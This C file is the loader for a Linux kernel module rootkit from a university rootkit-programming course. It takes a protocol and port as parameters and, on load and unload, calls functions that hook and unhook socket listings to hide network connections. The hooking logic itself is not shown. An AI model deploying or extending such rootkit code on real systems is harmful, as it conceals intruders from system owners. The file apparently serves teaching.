/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>

#include "hide_socket.h"
#include "include.h"

/* module parameters */
static char tlp_version[4];
module_param_string(protocol, tlp_version, 4, 0);
static int port_number;
module_param(port_number, int, 0);

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	ROOTKIT_DEBUG("Loading process-hider LKM...\n");
	
	/* ensure the input protocol is either 'tcp' or 'udp' */
	if(! (strcmp(tlp_version, "tcp") == 0 || strcmp(tlp_version, "udp") == 0) )
	{
		ROOTKIT_DEBUG("Please only use 'tcp' or 'udp' for the protocol version!\n");
		return -EINVAL;
	}
	
	hook_sockets(tlp_version, port_number);
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	unhook_sockets();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Unloading process-hider... bye!\n");
}
